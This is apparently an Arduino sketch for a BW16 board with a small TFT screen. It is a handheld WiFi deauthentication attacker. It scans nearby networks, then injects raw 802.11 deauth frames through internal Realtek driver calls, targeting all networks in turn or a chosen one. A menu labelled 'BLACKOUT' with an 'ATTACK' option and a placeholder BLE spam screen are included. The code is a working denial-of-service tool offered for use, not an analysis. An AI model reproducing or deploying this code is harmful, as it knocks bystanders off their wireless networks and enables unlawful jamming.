// Untuk reboot
extern "C" void NVIC_SystemReset(void);


#include <map>
#include <vector>
#include <WiFi.h>
#include <wifi_conf.h>
#include <wifi_util.h>
#include <WiFiClient.h>
#include <WiFiServer.h>
#include <wifi_structures.h>

// ===== CUSTOM STRUCT & FUNCTIONS =====
extern uint8_t* rltk_wlan_info;
extern "C" void* alloc_mgtxmitframe(void* ptr);
extern "C" void update_mgntframe_attrib(void* ptr, void* frame_control);
extern "C" int dump_mgntframe(void* ptr, void* frame_control);

typedef struct {
  uint16_t frame_control = 0xC0;
  uint16_t duration = 0xFFFF;
  uint8_t destination[6];
  uint8_t source[6];
  uint8_t access_point[6];
  const uint16_t sequence_number = 0;
  uint16_t reason = 0x06;
} DeauthFrame;

typedef struct {
  String ssid;
  String bssid_str;
  uint8_t bssid[6];
  short rssi;
  uint8_t channel;
} WiFiScanResult;

std::vector<WiFiScanResult> scan_results;

void sendWifiRawManagementFrames(void* frame, size_t length) {
  void *ptr = (void *)**(uint32_t **)(rltk_wlan_info + 0x10);
  void *frame_control = alloc_mgtxmitframe((uint8_t*)ptr + 0xae0);
  if (frame_control != 0) {
    update_mgntframe_attrib(ptr, (uint8_t*)frame_control + 8);
    memset((void *)*(uint32_t *)((uint8_t*)frame_control + 0x80), 0, 0x68);
    uint8_t *frame_data = (uint8_t *)*(uint32_t *)((uint8_t*)frame_control + 0x80) + 0x28;
    memcpy(frame_data, frame, length);
    *(uint32_t *)((uint8_t*)frame_control + 0x14) = length;
    *(uint32_t *)((uint8_t*)frame_control + 0x18) = length;
    dump_mgntframe(ptr, frame_control);
  }
}

void sendDeauthenticationFrames(void* src_mac, void* dst_mac, uint16_t reason) {
  DeauthFrame frame;
  memcpy(&frame.source, src_mac, 6);
  memcpy(&frame.access_point, src_mac, 6);
  memcpy(&frame.destination, dst_mac, 6);
  frame.reason = reason;
  sendWifiRawManagementFrames(&frame, sizeof(DeauthFrame));
}

rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
  if (scan_result->scan_complete == 0) {
    rtw_scan_result_t *record = &scan_result->ap_details;
    record->SSID.val[record->SSID.len] = 0;
    WiFiScanResult result;
    result.ssid = String((const char *)record->SSID.val);
    result.channel = record->channel;
    result.rssi = record->signal_strength;
    memcpy(&result.bssid, &record->BSSID, 6);
    char bssid_str[] = "XX:XX:XX:XX:XX:XX";
    snprintf(bssid_str, sizeof(bssid_str), "%02X:%02X:%02X:%02X:%02X:%02X", 
             result.bssid[0], result.bssid[1], result.bssid[2], 
             result.bssid[3], result.bssid[4], result.bssid[5]);
    result.bssid_str = bssid_str;
    scan_results.push_back(result);
  }
  return RTW_SUCCESS;
}

// ============================================
// UI (TFT + BUTTONS)
// ============================================
#include <Adafruit_GFX.h>
#include <Adafruit_ST7735.h>
#include <SPI.h>

#define TFT_CS     9
#define TFT_RST    7
#define TFT_DC     8
#define BTN_UP     4
#define BTN_DOWN   5
#define BTN_OK     6
#define BTN_BACK   3

Adafruit_ST7735 tft = Adafruit_ST7735(TFT_CS, TFT_DC, TFT_RST);



// ===== BITMAP SPLASH SCREEN =====

#include "bitmap.h"

  // PASTE  ARRAY 

// ===== STATE =====
int selectedMenu = 0;
int totalMenu = 4;
int currentScreen = 0;
int selectedNetwork = 0;
bool deauthActive = false;
int deauthPackets = 0;
int deauthTarget = -1;
int deauthMode = 0;
unsigned long lastDeauthTime = 0;
unsigned long lastBtnTime = 0;
unsigned long splashStartTime = 0;
int FRAMES_PER_DEAUTH = 5;
int DEAUTH_DELAY = 50;

#define DARKBLUE   0x0010
#define DARKGREEN  0x0300
#define DARKRED    0x8800
#define DARKGRAY   0x7BEF
#define CYAN       0x07FF
#define YELLOW     0xFFE0
#define MAGENTA    0xF81F

// ===== HEADER   =====
void headerBar(const char* title, uint16_t color) {
  tft.fillRect(0, 0, 128, 18, ST7735_BLACK);
  tft.fillRect(0, 0, 128, 2, color);
  tft.fillRect(0, 16, 128, 2, color);
  tft.setTextColor(color);
  tft.setTextSize(1);
  tft.setCursor(3, 3);
  tft.print("[ ");
  tft.print(title);
  tft.print(" ]");
  for (int i = 0; i < 128; i += 8) {
    tft.drawPixel(i, 1, ST7735_BLACK);
    tft.drawPixel(i, 17, ST7735_BLACK);
  }
}




// ===== FOOTER (10px, di Y=140) =====
void footerBar(const char* text) {
  tft.fillRect(0, 140, 128, 10, ST7735_BLACK);
  tft.drawFastHLine(0, 139, 128, CYAN);
  tft.setTextColor(DARKGRAY);
  tft.setTextSize(1);
  tft.setCursor(1, 142);
  tft.print("< ");
  tft.setTextColor(CYAN);
  tft.print(text);
  tft.setTextColor(DARKGRAY);
  tft.print(" >");
}



void initWiFi() {
  IPAddress localip(192, 168, 4, 1);
  IPAddress gateway(192, 168, 4, 1);
  IPAddress subnet(255, 255, 255, 0);
  WiFi.config(localip, gateway, subnet);
  WiFi.apbegin("BW16_Deauth", "0123456789", "1");
  delay(1000);
}

// ===== SCAN  =====
void doWiFiScan() {
  currentScreen = 2;
  scan_results.clear();
  
  tft.fillScreen(ST7735_BLACK);
  headerBar("NETSCAN v2.0", ST7735_GREEN);
  
  tft.setTextColor(ST7735_GREEN);
  tft.setCursor(5, 25);
  tft.print("$ netscan --all");
  delay(300);
  tft.setCursor(5, 40);
  tft.print("[*] Scanning...");
  
  // =====  SCAN =====
  wifi_scan_networks(scanResultHandler, NULL);
  
  // =====   (SCAN  ) =====
  tft.drawRect(5, 55, 118, 6, ST7735_GREEN);
  unsigned long startScan = millis();
  
  while (millis() - startScan < 5000) {
    int progress = (millis() - startScan) * 114 / 5000;
    tft.fillRect(7, 56, progress, 4, ST7735_GREEN);
    
    // Cek tombol BACK untuk cancel
    if (!digitalRead(BTN_BACK)) {
      currentScreen = 1;
      showMainMenu();
      return;
    }
    delay(50);
  }
  
  tft.fillRect(7, 56, 114, 4, ST7735_GREEN);
  tft.setCursor(5, 68);
  tft.print("[*] Done!      ");
  delay(300);
  
  // ===== CEK HASIL =====
  if (scan_results.size() > 0) {
    tft.fillScreen(ST7735_BLACK);
    headerBar("SCAN RESULT", ST7735_GREEN);
    
    int c2 = 0, c5 = 0;
    for (auto &n : scan_results) {
      if (n.channel <= 14) c2++; else c5++;
    }
    
    tft.setTextColor(ST7735_GREEN);
    tft.setCursor(5, 28);
    tft.print("Found: ");
    tft.setTextColor(YELLOW);
    tft.print((int)scan_results.size());
    
    tft.setTextColor(ST7735_WHITE);
    tft.setCursor(5, 48);
    tft.print("2.4G: " + String(c2) + "  5G: " + String(c5));
    
    tft.drawRect(15, 72, 98, 22, ST7735_GREEN);
    tft.setTextColor(ST7735_GREEN);
    tft.setCursor(28, 78);
    tft.print("[ VIEW LIST ]");
    
    footerBar("OK:List  BACK:Menu");
  } else {
    tft.fillScreen(ST7735_BLACK);
    headerBar("NO TARGETS", ST7735_RED);
    tft.setTextColor(ST7735_RED);
    tft.setCursor(10, 50);
    tft.print("No networks found");
    tft.setTextColor(DARKGRAY);
    tft.setCursor(10, 70);
    tft.print("Press OK to retry");
    footerBar("OK:Retry  BACK:Menu");
  }
}

// ===== WIFI LIST  =====
void showWiFiList() {
  currentScreen = 5;
  tft.fillScreen(ST7735_BLACK);
  headerBar("TARGET LIST", ST7735_GREEN);
  
  tft.setTextColor(DARKGRAY);
  tft.setCursor(5, 22);
  tft.print("[");
  tft.print((int)scan_results.size());
  tft.print(" targets]");
  
  int start = selectedNetwork - 1;
  if (start < 0) start = 0;
  if (start + 3 > (int)scan_results.size()) start = scan_results.size() - 3;
  if (start < 0) start = 0;
  
  int y = 26;
  for (int i = start; i < start + 3 && i < (int)scan_results.size(); i++) {
    if (i == selectedNetwork) {
      tft.drawRect(2, y, 124, 32, CYAN);
      tft.fillRect(3, y+1, 122, 30, ST7735_BLACK);
    }
    
    // Band + Ch + RSSI (1 baris)
    tft.setTextColor(scan_results[i].channel <= 14 ? ST7735_GREEN : ST7735_CYAN);
    tft.setCursor(6, y+4);
    tft.print(scan_results[i].channel <= 14 ? "[2.4]" : "[5G]");
    
    tft.setCursor(36, y+4);
    tft.print("CH");
    tft.print(scan_results[i].channel);
    
    int r = scan_results[i].rssi;
    if (r > -50) tft.setTextColor(ST7735_GREEN);
    else if (r > -70) tft.setTextColor(ST7735_YELLOW);
    else tft.setTextColor(ST7735_RED);
    tft.setCursor(78, y+4);
    tft.print(String(r) + "dB");
    
    // SSID
    tft.setTextColor(ST7735_WHITE);
    tft.setCursor(6, y+18);
    String s = scan_results[i].ssid;
    if (s.length() > 18) s = s.substring(0, 16) + "..";
    tft.print(s);
    
    if (i == selectedNetwork) {
      tft.setTextColor(YELLOW);
      tft.setCursor(120, y+10);
      tft.print("<");
    }
    
    y += 35;
  }
  
  footerBar("UP/DN:Nav  OK:Sel  BACK");
}


// ===== DEAUTH DEDSEC =====
void drawDeauthScreen() {
  tft.fillScreen(ST7735_BLACK);
  headerBar("BLACKOUT", deauthActive ? ST7735_RED : DARKRED);
  
  tft.drawRect(4, 22, 120, 16, ST7735_RED);
  tft.setTextColor(ST7735_RED);
  tft.setCursor(8, 25);
  tft.print("/// RESTRICTED ///");
  
  tft.setTextColor(ST7735_GREEN);
  tft.setCursor(5, 45);
  tft.print("[ TARGET ]");
  tft.setTextColor(ST7735_WHITE);
  tft.setCursor(5, 56);
  if (deauthTarget == -1) tft.print("ALL NETWORKS");
  else if (deauthTarget < (int)scan_results.size()) {
    String s = scan_results[deauthTarget].ssid;
    if (s.length() > 18) s = s.substring(0, 16) + "..";
    tft.print(s);
  }
  
  tft.setTextColor(ST7735_GREEN);
  tft.setCursor(5, 72);
  tft.print("[ PACKETS ]");
  tft.setTextColor(CYAN);
  tft.setCursor(5, 83);
  tft.print(deauthPackets);
  
  if (!deauthActive) {
    tft.setTextColor(ST7735_GREEN);
    tft.setCursor(5, 100);
    tft.print("[ MODE ]");
    
    tft.drawRect(5, 110, 56, 20, deauthMode == 0 ? CYAN : DARKGRAY);
    tft.setTextColor(deauthMode == 0 ? CYAN : DARKGRAY);
    tft.setCursor(14, 114);
    tft.print("ALL");
    
    tft.drawRect(67, 110, 56, 20, deauthMode == 1 ? CYAN : DARKGRAY);
    tft.setTextColor(deauthMode == 1 ? CYAN : DARKGRAY);
    tft.setCursor(72, 114);
    tft.print("SELECT");
    
    footerBar("OK:Launch  UP/DN:Mode");
  } else {
    tft.setTextColor(ST7735_RED);
    tft.setCursor(25, 105);
    tft.print(">>> EXECUTING <<<");
    
    tft.drawRect(20, 115, 88, 20, ST7735_RED);
    tft.setTextColor(ST7735_RED);
    tft.setCursor(38, 119);
    tft.print("[ ABORT ]");
    
    footerBar("OK/BACK:Abort");
  }
}


// ===== SPLASH FULL SCREEN =====
void showSplashScreen() {
  tft.fillScreen(ST7735_BLACK);
  tft.drawBitmap(0, 0, epd_bitmap_sed, 128, 160, ST7735_WHITE);
  delay(800);
  
  // 5x pixel shift (tambah 1x)
  for (int g = 0; g < 5; g++) {
    int yStart = random(35, 95);
    int h = random(8, 18);
    int shift = random(-28, 28);  // Lebih lebar
    
    tft.fillRect(0, yStart, 128, h, ST7735_BLACK);
    
    for (int y = 0; y < h; y++) {
      for (int x = 0; x < 128; x++) {
        int srcX = x - shift;
        if (srcX < 0) srcX += 128;
        if (srcX >= 128) srcX -= 128;
        
        int byteIdx = ((yStart + y) * 128 + srcX) / 8;
        int bitIdx = 7 - (srcX % 8);
        
        if (byteIdx < (int)sizeof(epd_bitmap_sed)) {
          if ((epd_bitmap_sed[byteIdx] >> bitIdx) & 0x01) {
            tft.drawPixel(x, yStart + y, ST7735_WHITE);
          }
        }
      }
    }
    
  
    for (int i = 0; i < 15; i++) {
      tft.drawPixel(random(0, 128), yStart + random(0, h), ST7735_BLACK);
    }
    
    delay(150);
    tft.drawBitmap(0, 0, epd_bitmap_sed, 128, 160, ST7735_WHITE);
    delay(80);
  }
  
  // Loading bar kecil
  tft.drawRect(20, 148, 88, 4, CYAN);
  for (int i = 0; i < 84; i += 7) {
    tft.fillRect(22, 149, i, 2, CYAN);
    delay(8);
  }
  
  tft.fillScreen(ST7735_BLACK);
}

 

// ===== MAIN MENU  =====
void showMainMenu() {
  currentScreen = 1;
  tft.fillScreen(ST7735_BLACK);
  headerBar("MAIN MENU", CYAN);
  
  const char* items[] = {"WiFi_SCAN", "DEAUTH", "BLE_SPAM", "REBOOT"};
  const char* descs[] = {"NetScan", "Blackout", "BluePill", "System"};
  const uint16_t colors[] = {ST7735_GREEN, ST7735_RED, MAGENTA, CYAN};
  
  int y = 22;  
  
  for (int i = 0; i < 4; i++) {
    if (i == selectedMenu) {
      tft.drawRect(4, y-2, 120, 26, CYAN);
      tft.drawRect(6, y, 116, 22, colors[i]);
      tft.fillRect(7, y+1, 114, 20, ST7735_BLACK);
    } else {
      tft.drawRect(4, y-2, 120, 26, DARKGRAY);
      tft.fillRect(7, y+1, 114, 20, ST7735_BLACK);
    }
    
    tft.setTextColor(colors[i]);
    tft.setCursor(12, y+3);
    tft.print("> ");
    tft.print(items[i]);
    
    tft.setTextColor(DARKGRAY);
    tft.setCursor(12, y+15);
    tft.print(descs[i]);
    
    if (i == selectedMenu) {
      tft.fillRect(110, y+5, 4, 4, colors[i]);
    }
    
    y += 27;  
  }
  
  footerBar("UP/DN:Nav  OK:Sel");
}

// ===== BLE SPAM UI =====
void showBLEScreen() {
  currentScreen = 4;
  tft.fillScreen(ST7735_BLACK);
  headerBar("BLUEPILL", MAGENTA);
  
  tft.setTextColor(MAGENTA);
  tft.setCursor(10, 40);
  tft.print("[*] BLE Spam Module");
  tft.setCursor(10, 58);
  tft.print("[*] Status: STANDBY");
  tft.setCursor(10, 76);
  tft.print("[*] Range: 10m");
  
  tft.drawRect(25, 105, 78, 20, MAGENTA);
  tft.setTextColor(MAGENTA);
  tft.setCursor(35, 109);
  tft.print("[ LAUNCH ]");
  
  footerBar("OK:Launch  BACK:Menu");
}

// ===== DETAIL  =====
void showDetailScreen() {
  currentScreen = 6;
  tft.fillScreen(ST7735_BLACK);
  headerBar("TARGET INFO", CYAN);
  
  tft.setTextColor(ST7735_GREEN);
  tft.setCursor(5, 25);
  tft.print("[ SSID ]");
  tft.setTextColor(ST7735_WHITE);
  tft.setCursor(5, 36);
  String s = scan_results[selectedNetwork].ssid;
  if (s.length() > 18) s = s.substring(0, 16) + "..";
  tft.print(s);
  
  tft.setTextColor(ST7735_GREEN);
  tft.setCursor(5, 50);
  tft.print("[ BSSID ]");
  tft.setTextColor(CYAN);
  tft.setCursor(5, 61);
  tft.print(scan_results[selectedNetwork].bssid_str);
  
  tft.setTextColor(ST7735_GREEN);
  tft.setCursor(5, 75);
  tft.print("[ CH ]");
  tft.setTextColor(ST7735_WHITE);
  tft.setCursor(5, 86);
  tft.print(String(scan_results[selectedNetwork].channel));
  tft.print(scan_results[selectedNetwork].channel <= 14 ? " (2.4G)" : " (5G)");
  
  tft.setTextColor(ST7735_GREEN);
  tft.setCursor(5, 100);
  tft.print("[ RSSI ]");
  tft.setTextColor(ST7735_WHITE);
  tft.setCursor(5, 111);
  tft.print(String(scan_results[selectedNetwork].rssi) + " dBm");
  
  tft.drawRect(20, 120, 88, 16, ST7735_RED);
  tft.setTextColor(ST7735_RED);
  tft.setCursor(28, 123);
  tft.print("[ BLACKOUT ]");
  
  footerBar("OK:Attack  BACK:List");
}

// ===== DEAUTH FUNCTIONS =====
void startDeauth() {
  if (scan_results.empty()) return;
  deauthActive = true;
  deauthPackets = 0;
  lastDeauthTime = millis() - DEAUTH_DELAY;
  currentScreen = 3;
  drawDeauthScreen();
}

void stopDeauth() {
  deauthActive = false;
  drawDeauthScreen();
}

void deauthLoop() {
  if (!deauthActive || scan_results.empty()) return;
  if (millis() - lastDeauthTime < DEAUTH_DELAY) return;
  lastDeauthTime = millis();
  
  static int idx = 0;
  if (deauthTarget == -1) idx = (idx + 1) % scan_results.size();
  else idx = deauthTarget;
  
  uint8_t bssid[6];
  memcpy(bssid, scan_results[idx].bssid, 6);
  
  wext_set_channel(WLAN0_NAME, scan_results[idx].channel);
  
  for (int i = 0; i < FRAMES_PER_DEAUTH; i++) {
    sendDeauthenticationFrames(bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", 2);
    deauthPackets++;
    delay(5);
  }
  
  if (currentScreen == 3) {
    tft.fillRect(60, 78, 60, 14, ST7735_BLACK);
    tft.setTextColor(ST7735_GREEN);
    tft.setCursor(60, 80);
    tft.print(deauthPackets);
  }
}



void handleButtons() {
  if (millis() - lastBtnTime < 200) return;
  
  bool up = !digitalRead(BTN_UP);
  bool down = !digitalRead(BTN_DOWN);
  bool ok = !digitalRead(BTN_OK);
  bool back = !digitalRead(BTN_BACK);
  
  if (!up && !down && !ok && !back) return;
  lastBtnTime = millis();
  
  if (back) {
    if (deauthActive) stopDeauth();
    currentScreen = 1;
    showMainMenu();
    return;
  }
  
  if (ok && deauthActive) { stopDeauth(); return; }
  
  switch (currentScreen) {
    case 1:
      if (up) selectedMenu = (selectedMenu + 3) % 4;      // <<< UBAH % 3 jadi % 4
      if (down) selectedMenu = (selectedMenu + 1) % 4;     // <<< UBAH % 3 jadi % 4
      if (up || down) showMainMenu();
      if (ok) {
        if (selectedMenu == 0) { selectedNetwork = 0; doWiFiScan(); }
        else if (selectedMenu == 1) { stopDeauth(); deauthTarget = -1; deauthMode = 0; deauthPackets = 0; currentScreen = 3; drawDeauthScreen(); }
        else if (selectedMenu == 2) showBLEScreen();       // <<< UBAH jadi else if
        else if (selectedMenu == 3) showRebootScreen();    // <<< TAMBAH
      }
      break;
    case 2:
      if (ok) { if (scan_results.size() > 0) showWiFiList(); else doWiFiScan(); }
      break;
    case 3:
      if (!deauthActive) {
        if (up || down) { deauthMode = !deauthMode; deauthTarget = deauthMode ? 0 : -1; drawDeauthScreen(); }
        if (ok) {
          if (deauthMode == 1 && scan_results.size() > 0) { currentScreen = 5; showWiFiList(); }
          else { deauthTarget = -1; startDeauth(); }
        }
      }
      break;
    case 5:
      if (up && scan_results.size() > 0) { selectedNetwork = (selectedNetwork - 1 + scan_results.size()) % scan_results.size(); showWiFiList(); }
      if (down && scan_results.size() > 0) { selectedNetwork = (selectedNetwork + 1) % scan_results.size(); showWiFiList(); }
      if (ok && scan_results.size() > 0) {
        if (deauthMode == 1) { deauthTarget = selectedNetwork; currentScreen = 3; startDeauth(); }
        else {
          currentScreen = 6;
          showDetailScreen();
          footerBar("OK:Attack  BACK:List");
        }
      }
      break;
    case 6:
      if (ok) { deauthTarget = selectedNetwork; currentScreen = 3; startDeauth(); }
      break;
    case 7:                             
      if (ok) { rebootDevice(); }         
      break;                              
  }
}

void setup() {
  Serial.begin(115200);
  delay(500);
  
  // ===== 
  wifi_off();
  delay(300);
  
  // ===== INIT TOMBOL =====
  pinMode(BTN_UP, INPUT_PULLUP);
  pinMode(BTN_DOWN, INPUT_PULLUP);
  pinMode(BTN_OK, INPUT_PULLUP);
  pinMode(BTN_BACK, INPUT_PULLUP);
  
  // ===== RESET TFT =====
  pinMode(TFT_RST, OUTPUT);
  digitalWrite(TFT_RST, LOW);
  delay(50);
  digitalWrite(TFT_RST, HIGH);
  delay(150);
  
  // ===== INIT TFT =====
  tft.initR(INITR_REDTAB);
  tft.setRotation(0);
  tft.fillScreen(ST7735_BLACK);
  delay(100);
  
  // Test pattern (biar tau TFT hidup)
  tft.fillRect(0, 0, 128, 5, ST7735_GREEN);
  delay(200);
  tft.fillScreen(ST7735_BLACK);
  
  // ===== on WIFI =====
  initWiFi();
  
  // ===== SPLASH =====
  showSplashScreen();
  splashStartTime = millis();
  currentScreen = 0;
}

void loop() {
  handleButtons();
  deauthLoop();
  
  if (currentScreen == 0 && millis() - splashStartTime > 4000) {
    currentScreen = 1;
    showMainMenu();
  }
  delay(1);
}


// ===== REBOOT SCREEN =====
void showRebootScreen() {
  currentScreen = 7;
  tft.fillScreen(ST7735_BLACK);
  headerBar("REBOOT", CYAN);
  
  tft.setTextColor(ST7735_WHITE);
  tft.setCursor(15, 40);
  tft.print("[ SYSTEM REBOOT ]");
  
  tft.setTextColor(CYAN);
  tft.setCursor(10, 60);
  tft.print("Restart BW16?");
  
  tft.drawRect(15, 90, 98, 22, CYAN);
  tft.setTextColor(CYAN);
  tft.setCursor(30, 95);
  tft.print("[ CONFIRM ]");
  
  tft.drawRect(15, 118, 98, 18, DARKGRAY);
  tft.setTextColor(DARKGRAY);
  tft.setCursor(32, 122);
  tft.print("[ CANCEL ]");
  
  footerBar("OK:Reboot  BACK:Cancel");
}

void rebootDevice() {
  tft.fillScreen(ST7735_BLACK);
  headerBar("REBOOTING...", ST7735_RED);
  tft.setTextColor(ST7735_WHITE);
  tft.setCursor(35, 60);
  tft.print("Reboot...");
  delay(500);
  wdt_enable(10);
  while(1);
}
  
